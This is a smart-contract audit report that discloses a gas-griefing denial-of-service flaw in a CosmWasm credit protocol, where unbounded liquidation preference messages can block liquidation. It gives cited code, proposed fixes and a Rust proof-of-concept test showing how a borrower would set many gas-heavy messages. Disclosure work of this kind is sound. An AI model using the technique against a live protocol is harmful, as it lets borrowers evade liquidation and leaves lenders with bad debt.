# Audit Report

## Title
Gas Griefing DoS Attack via Unbounded Liquidation Preference Messages

## Summary
An attacker can prevent their account from being liquidated by setting an unlimited number of gas-expensive messages as liquidation preferences. When a liquidation is triggered, these preference messages consume excessive gas, causing the entire liquidation transaction to fail due to gas limits. This enables attackers to maintain undercollateralized positions indefinitely, threatening protocol solvency.

## Finding Description

The vulnerability exists in the liquidation preference mechanism where users can set arbitrary `LiquidateMsg` messages that are executed before liquidator-provided messages during account liquidation.

**Root Cause:**

The `set_preference_msgs` function accepts an unbounded vector of liquidation messages without any validation: [1](#0-0) 

During liquidation, preference messages are added to the execution queue: [2](#0-1) 

Each preference message is executed via `SubMsg::reply_always` **without gas limits**: [3](#0-2) 

The messages are forwarded through the account contract's sudo function: [4](#0-3) 

While the reply handler catches errors from preference messages: [5](#0-4) 

**The critical flaw is that gas consumption occurs regardless of whether errors are caught.** In CosmWasm, SubMsg execution without gas limits shares the parent transaction's gas meter. Even though `reply_always` catches failures, the gas consumed before failure is never refunded.

**Attack Mechanism:**

1. Attacker creates account, deposits collateral, borrows funds
2. Attacker calls `AccountMsg::SetPreferenceMsgs` with 50-100 `LiquidateMsg::Execute` messages, each calling a contract with expensive operations (complex loops, storage operations)
3. Account becomes unsafe (LTV >= liquidation_threshold)
4. Liquidator attempts liquidation via `ExecuteMsg::Liquidate`
5. The `DoLiquidate` flow processes preference messages sequentially in the same transaction: [6](#0-5) 

6. Each preference message consumes gas through SubMsg execution
7. Cumulative gas consumption from multiple messages exceeds the transaction's gas limit
8. Entire liquidation transaction fails with out-of-gas error
9. Account remains unsafe, violating the protocol's liquidation invariant

**Broken Invariants:**

- **Safe Liquidation Outcomes** (Invariant #3): Liquidations should trigger when `adjusted_ltv >= liquidation_threshold` and complete successfully. The DoS prevents liquidation completion.
- **System Solvency**: The protocol relies on timely liquidations to maintain collateralization. Preventing liquidations threatens systemic solvency.

## Impact Explanation

**Severity: High**

This vulnerability enables:

1. **Systemic Undercollateralization Risk**: Attackers can maintain positions with LTV > 1 indefinitely, accumulating bad debt
2. **Protocol Insolvency**: If collateral values drop further while liquidation is blocked, the protocol suffers unrecoverable losses
3. **Lender Losses**: Vault depositors face losses as borrowers cannot be liquidated
4. **Cascading Failures**: Multiple undercollateralized positions increase systemic risk

Financial impact:
- Direct: Attackers can borrow up to their collateral value and prevent repayment, stealing lent funds
- Indirect: Protocol reputation damage, loss of user confidence, potential vault runs

## Likelihood Explanation

**Likelihood: High**

This attack is:
- **Easy to Execute**: Requires only calling `SetPreferenceMsgs` with gas-expensive messages (no special permissions needed)
- **Low Cost**: Setting preferences has minimal gas cost; the expensive operations only trigger during liquidation attempts (borne by liquidators)
- **Highly Profitable**: Attackers can extract maximum borrowing value without repayment risk
- **Difficult to Mitigate**: No on-chain mechanism prevents this attack; requires protocol upgrade

Preconditions:
- Attacker has a credit account (trivial to create)
- Attacker can identify or deploy a contract with expensive operations (common)
- Market conditions cause account to become liquidatable (natural occurrence)

## Recommendation

Implement gas limits on liquidation preference message execution:

1. **Add gas limits to SubMsg execution:**
```rust
SubMsg::reply_always(
    account.account.execute(contract_addr.clone(), msg.clone(), funds.clone())?,
    reply_id,
)
.with_gas_limit(config.max_preference_gas) // Add gas limit per message
.with_payload(to_json_binary(&account)?)
```

2. **Add validation in `set_preference_msgs`:**
```rust
pub fn set_preference_msgs(&mut self, msgs: Vec<LiquidateMsg>) -> Result<(), ContractError> {
    const MAX_PREFERENCE_MESSAGES: usize = 10;
    ensure!(
        msgs.len() <= MAX_PREFERENCE_MESSAGES,
        ContractError::TooManyPreferenceMessages { limit: MAX_PREFERENCE_MESSAGES }
    );
    self.liquidation_preferences.messages = msgs;
    Ok(())
}
```

3. **Add configuration parameter for max gas per preference message:**
```rust
pub struct Config {
    // ... existing fields ...
    pub max_preference_gas: u64, // e.g., 1_000_000 gas per message
}
```

This ensures:
- Each preference message has bounded gas consumption
- Failed messages consume limited gas
- Total gas consumption = num_messages × max_preference_gas (bounded)
- Liquidations can complete even with malicious preferences

## Proof of Concept

```rust
#[cfg(test)]
mod gas_grief_attack {
    use super::*;
    use cosmwasm_std::{coin, coins, to_json_binary, Addr};
    use cw_multi_test::Executor;
    use rujira_rs::ghost::credit::{AccountMsg, LiquidateMsg};
    
    #[test]
    fn test_gas_grief_dos_liquidation() {
        let mut app = mock_rujira_app();
        let owner = app.api().addr_make("attacker");
        let liquidator = app.api().addr_make("liquidator");
        
        // Setup protocol (vaults, credit registry, etc.)
        let ctx = setup(&mut app, &owner);
        
        // 1. Attacker creates account and deposits collateral
        app.send_tokens(
            owner.clone(),
            ctx.account.account.clone(),
            &[coin(10000000, "BTC")], // 0.1 BTC
        ).unwrap();
        
        // 2. Attacker borrows near maximum
        let account = ctx.ghost_credit.query_account(&app, &ctx.account.account);
        ctx.ghost_credit
            .account_borrow(&mut app, &account, 888000000000, "USDC")
            .unwrap();
        
        // 3. Attacker sets 50 gas-expensive preference messages
        let expensive_contract = deploy_gas_expensive_contract(&mut app);
        let mut preference_msgs = vec![];
        for _ in 0..50 {
            preference_msgs.push(LiquidateMsg::Execute {
                contract_addr: expensive_contract.to_string(),
                msg: to_json_binary(&ExecuteMsg::ExpensiveOperation {
                    iterations: 10000, // Many expensive operations
                }).unwrap(),
                funds: vec![],
            });
        }
        
        ctx.ghost_credit.account(
            &mut app,
            &account,
            vec![AccountMsg::SetPreferenceMsgs(preference_msgs)],
        ).unwrap();
        
        // 4. Price drops, account becomes unsafe
        app.init_modules(|router, _api, _storage| {
            router.stargate.with_prices(vec![
                ("BTC", Decimal::from_str("80000").unwrap()), // Price drops
            ]);
        });
        
        let account = ctx.ghost_credit.query_account(&app, &ctx.account.account);
        assert!(account.ltv > Decimal::one()); // Account is unsafe
        
        // 5. Liquidator attempts liquidation - FAILS due to gas grief
        let result = ctx.ghost_credit.liquidate_execute_repay(
            &mut app,
            &account,
            ctx.fin_btc_usdc.addr(),
            fin::ExecuteMsg::Swap(fin::SwapRequest::Yolo {
                to: None,
                callback: None,
            }),
            coins(1000000, "BTC"),
            "USDC",
        );
        
        // Liquidation fails with out-of-gas error
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("out of gas"));
        
        // 6. Account remains unsafe, protocol suffers bad debt
        let account = ctx.ghost_credit.query_account(&app, &ctx.account.account);
        assert!(account.ltv > Decimal::one()); // Still unsafe!
    }
}
```

The PoC demonstrates that an attacker can successfully prevent liquidation by setting many gas-expensive preference messages, violating the protocol's liquidation invariant and enabling bad debt accumulation.

### Citations

**File:** contracts/rujira-ghost-credit/src/account.rs (L231-233)
```rust
    pub fn set_preference_msgs(&mut self, msgs: Vec<LiquidateMsg>) {
        self.liquidation_preferences.messages = msgs
    }
```

**File:** contracts/rujira-ghost-credit/src/contract.rs (L80-87)
```rust
            let mut prefs: Vec<(LiquidateMsg, bool)> = account
                .liquidation_preferences
                .messages
                .iter()
                .map(|x| (x.clone(), true))
                .collect();
            prefs.reverse();
            queue.append(&mut prefs);
```

**File:** contracts/rujira-ghost-credit/src/contract.rs (L124-146)
```rust
                (Some((msg, is_preference)), Err(_)) => {
                    // Not safe, more messages to go. Continue
                    Ok(execute_liquidate(
                        deps.as_ref(),
                        env.clone(),
                        info,
                        &config,
                        msg,
                        &account,
                        if is_preference {
                            REPLY_ID_PREFERENCE
                        } else {
                            REPLY_ID_LIQUIDATOR
                        },
                    )?
                    .add_message(
                        ExecuteMsg::DoLiquidate {
                            addr: account.id().to_string(),
                            queue,
                            payload,
                        }
                        .call(&ca)?,
                    ))
```

**File:** contracts/rujira-ghost-credit/src/contract.rs (L319-337)
```rust
        LiquidateMsg::Execute {
            contract_addr,
            msg,
            funds,
        } => Ok(Response::default()
            .add_submessage(
                SubMsg::reply_always(
                    account
                        .account
                        .execute(contract_addr.clone(), msg.clone(), funds.clone())?,
                    reply_id,
                )
                .with_payload(to_json_binary(&account)?),
            )
            .add_event(event_execute_liquidate_execute(
                &contract_addr,
                &msg,
                &NativeBalance(funds),
            ))),
```

**File:** contracts/rujira-ghost-credit/src/contract.rs (L342-351)
```rust
pub fn reply(_deps: DepsMut, _env: Env, msg: Reply) -> Result<Response, ContractError> {
    match (msg.result, msg.id) {
        (SubMsgResult::Err(err), REPLY_ID_PREFERENCE) => {
            // Don't block execution if this is a preferential step
            Ok(Response::default().add_event(event_execute_liquidate_preference_error(err)))
        }
        (SubMsgResult::Err(err), REPLY_ID_LIQUIDATOR) => Err(StdError::generic_err(err).into()),
        (SubMsgResult::Ok(_), _) => Ok(Response::default()),
        _ => Err(ContractError::Unauthorized {}),
    }
```

**File:** contracts/rujira-account/src/contract.rs (L33-35)
```rust
pub fn sudo(_deps: DepsMut, _env: Env, msg: CosmosMsg) -> Result<Response, ContractError> {
    Ok(Response::default().add_message(msg))
}
```
